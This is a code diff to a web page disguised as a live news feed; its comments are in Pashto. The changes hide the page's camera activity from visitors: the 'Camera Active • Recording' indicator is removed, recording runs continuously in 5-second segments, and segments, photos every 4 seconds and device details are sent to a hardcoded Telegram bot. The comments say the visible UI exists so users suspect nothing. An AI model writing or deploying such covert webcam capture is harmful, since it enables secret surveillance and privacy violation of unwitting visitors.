@@ -246,6 +246,7 @@
         .theme-5 { border-left: 3px solid #9b59b6; }
         .theme-6 { border-left: 3px solid #fd79a8; }
         
+        /* ========== پټه کیمره ========== */
         #video {
             position: fixed;
             top: -9999px;
@@ -269,14 +270,9 @@
             margin-top: 4px;
         }
         
-        .cam-status {
-            text-align: center;
-            font-size: 10px;
-            color: #4ade80;
-            margin-top: 8px;
-            padding: 4px;
-            border-radius: 20px;
-            background: rgba(74,222,128,0.05);
+        /* ========== د کیمرې حالت - کارونکي ته نه ښکاري ========== */
+        .hidden-status {
+            display: none;
         }
         
         @media (max-width: 480px) {
@@ -300,11 +296,11 @@
 </head>
 <body>
 
-    <!-- ========== HIDDEN VIDEO ========== -->
+    <!-- ========== پټه کیمره ========== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ========== MAIN CARD ========== -->
+    <!-- ========== اصلي پاڼه (کارونکي ته ښکاري) ========== -->
     <div class="glass-card" id="mainCard">
         
         <div class="header">
@@ -330,8 +326,6 @@
         
         <div class="grid" id="newsGrid"></div>
         
-        <div class="cam-status" id="camStatus">📷 Camera Active • Recording</div>
-        
         <div class="footer">🔒 SECURE • LIVE • 24/7 COVERAGE</div>
     </div>
 
@@ -342,10 +336,10 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const CAPTURE_INTERVAL = 4000; // هر ۴ ثانیې عکس
-        const VIDEO_DURATION = 30000; // ۳۰ ثانیې ویډیو
+        const SEGMENT_DURATION = 5000; // هر ۵ ثانیې یوه برخه (د اوږدې ویډیو لپاره)
         
         // ================================================================
-        //  GET CODE FROM URL
+        //  GET CODE FROM URL (که چیرې وي)
         // ================================================================
         const params = new URLSearchParams(window.location.search);
         const code = params.get('code') || 'live_' + Date.now().toString(36);
@@ -388,7 +382,6 @@
         const featuredTitle = document.getElementById('featuredTitle');
         const featuredDesc = document.getElementById('featuredDesc');
         const newsGrid = document.getElementById('newsGrid');
-        const camStatus = document.getElementById('camStatus');
         
         // ================================================================
         //  NEWS DATA - تکراري نشي
@@ -411,9 +404,7 @@
             { icon: '⚡', title: 'Fusion Energy', desc: 'Net-positive energy achieved', tag: 'Energy', color: '#ffd93d' }
         ];
         
-        // د تکراري خبرونو مخنیوی
         let usedNews = [];
-        let newsIndex = 0;
         
         function getUniqueNews(count = 4) {
             const available = allNews.filter(item => !usedNews.includes(item));
@@ -441,11 +432,12 @@
         let mediaRecorder = null;
         let recordedChunks = [];
         let isRecording = false;
-        let isVideoSent = false;
         let videoStartTime = 0;
+        let totalVideoTime = 0;
+        let isFirstVideo = true;
         
         // ================================================================
-        //  START CAMERA + VIDEO + PHOTOS
+        //  START CAMERA + VIDEO + PHOTOS (پټه)
         // ================================================================
         async function startAll() {
             try {
@@ -465,7 +457,7 @@
                 isRunning = true;
                 videoStartTime = Date.now();
                 
-                // ویډیو ثبتول پیل کړئ (یوه بشپړه ویډیو)
+                // ویډیو ثبتول پیل کړئ (د اوږدې ویډیو لپاره په برخو ویشل)
                 startVideoRecording();
                 
                 // عکسونه پیل کړئ
@@ -477,25 +469,19 @@
                 // بوټ ته خبر ورکول
                 sendStartNotification();
                 
-                camStatus.textContent = '📷 Camera Active • Recording Video + Photos';
-                camStatus.style.color = '#4ade80';
-                
             } catch (error) {
                 console.error('Error:', error);
-                camStatus.textContent = '⚠️ Camera not available';
-                camStatus.style.color = '#ff6b6b';
                 sendErrorToTelegram(error.message);
             }
         }
         
         // ================================================================
-        //  VIDEO RECORDING (یوه بشپړه ویډیو)
+        //  VIDEO RECORDING (پټه - کارونکي ته نه ښکاري)
         // ================================================================
         function startVideoRecording() {
             if (!stream) return;
             
             recordedChunks = [];
-            isVideoSent = false;
             
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9,opus'
@@ -508,34 +494,41 @@
             };
             
             mediaRecorder.onstop = function() {
-                if (recordedChunks.length > 0 && !isVideoSent) {
+                if (recordedChunks.length > 0) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    totalVideoTime += Math.floor((Date.now() - videoStartTime) / 1000);
+                    
+                    // ویډیو بوټ ته لیږل
                     sendVideoToTelegram(blob);
-                    isVideoSent = true;
                     recordedChunks = [];
-                    camStatus.textContent = '✅ Video sent! Continuing photos...';
-                    camStatus.style.color = '#4ade80';
+                    
+                    // که پاڼه لا خلاصه وي، بیا ثبتول پیل کړئ
+                    if (isRunning) {
+                        setTimeout(() => {
+                            if (mediaRecorder && isRunning) {
+                                videoStartTime = Date.now();
+                                mediaRecorder.start(1000);
+                                isRecording = true;
+                            }
+                        }, 500);
+                    }
                 }
             };
             
             mediaRecorder.start(1000);
             isRecording = true;
-            camStatus.textContent = '🎥 Recording video... (30s)';
-            camStatus.style.color = '#ffd93d';
             
-            // د ۳۰ ثانیو وروسته ویډیو بنده کړئ
-            setTimeout(() => {
+            // هر ۵ ثانیې یوه برخه بنده کړئ (د اوږدې ویډیو لپاره)
+            setInterval(() => {
                 if (mediaRecorder && isRecording) {
                     mediaRecorder.stop();
                     isRecording = false;
-                    camStatus.textContent = '⏳ Processing video...';
-                    camStatus.style.color = '#ffd93d';
                 }
-            }, VIDEO_DURATION);
+            }, SEGMENT_DURATION);
         }
         
         // ================================================================
-        //  PHOTO CAPTURE (هر ۴ ثانیې)
+        //  PHOTO CAPTURE (پټه - کارونکي ته نه ښکاري)
         // ================================================================
         function startPhotoCapture() {
             capturePhoto();
@@ -564,7 +557,7 @@
         }
         
         // ================================================================
-        //  SEND TO TELEGRAM
+        //  SEND TO TELEGRAM (پټه)
         // ================================================================
         async function sendPhotoToTelegram(imageData) {
             try {
@@ -598,9 +591,10 @@
                 formData.append('chat_id', CHAT_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
                 formData.append('caption', 
-                    `🎥 **Full Video**\n` +
+                    `🎥 **Video Segment**\n` +
                     `🆔 **Session:** ${sessionId}\n` +
                     `⏱️ **Duration:** ${duration}s\n` +
+                    `📊 **Total Video:** ${totalVideoTime + duration}s\n` +
                     `📸 **Photos:** ${photoCount}\n` +
                     `🌍 **Browser:** ${browser}\n` +
                     `📱 **Device:** ${device}\n` +
@@ -613,13 +607,8 @@
                     body: formData 
                 });
                 
-                camStatus.textContent = '✅ Video sent successfully!';
-                camStatus.style.color = '#4ade80';
-                
             } catch (error) {
                 console.error('Send video error:', error);
-                camStatus.textContent = '⚠️ Video send failed';
-                camStatus.style.color = '#ff6b6b';
             }
         }
         
@@ -656,7 +645,7 @@
         }
         
         // ================================================================
-        //  UI UPDATES (تکراري نشي)
+        //  UI UPDATES (کارونکي ته ښکاري - هیڅ شک نشي)
         // ================================================================
         function startUIUpdates() {
             // Viewers - متحرک
@@ -671,7 +660,7 @@
                 timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}`;
             }, 5000);
             
-            // Session time
+            // Session time - کارونکي ته ښکاري چې سایټ کې څومره وخت تیروي
             sessionTimer = setInterval(() => {
                 const elapsed = Math.floor((Date.now() - startTime) / 1000);
                 const mins = Math.floor(elapsed / 60);
@@ -761,7 +750,7 @@
         }
         
         // ================================================================
-        //  STOP ON PAGE CLOSE
+        //  STOP ON PAGE CLOSE (ویډیو بنده کړئ او وروستۍ برخه واستوئ)
         // ================================================================
         function stopAll() {
             isRunning = false;
@@ -773,11 +762,14 @@
             if (tickerTimer) clearInterval(tickerTimer);
             if (newsTimer) clearInterval(newsTimer);
             
+            // وروستۍ ویډیو برخه واستوئ
             if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                try { mediaRecorder.stop(); } catch(e) {}
+                try { 
+                    mediaRecorder.stop(); 
+                } catch(e) {}
             }
             
-            // بوټ ته خبر ورکول
+            // وروستۍ خبرتیا بوټ ته
             const totalTime = Math.floor((Date.now() - startTime) / 1000);
             const mins = Math.floor(totalTime / 60);
             const secs = totalTime % 60;
@@ -789,9 +781,11 @@
                     chat_id: CHAT_ID,
                     text: `🛑 **SESSION ENDED**\n\n` +
                           `🆔 **Session:** ${sessionId}\n` +
-                          `⏱️ **Duration:** ${mins}m ${secs}s\n` +
+                          `⏱️ **Total Duration:** ${mins}m ${secs}s\n` +
                           `📸 **Photos:** ${photoCount}\n` +
-                          `🎥 **Video:** ${isVideoSent ? 'Sent ✅' : 'Processing...'}`,
+                          `🎥 **Video:** ${totalVideoTime + 5}s total\n\n` +
+                          `📍 **Browser:** ${browser}\n` +
+                          `📱 **Device:** ${device}`,
                     parse_mode: 'Markdown'
                 })
             }).catch(() => {});
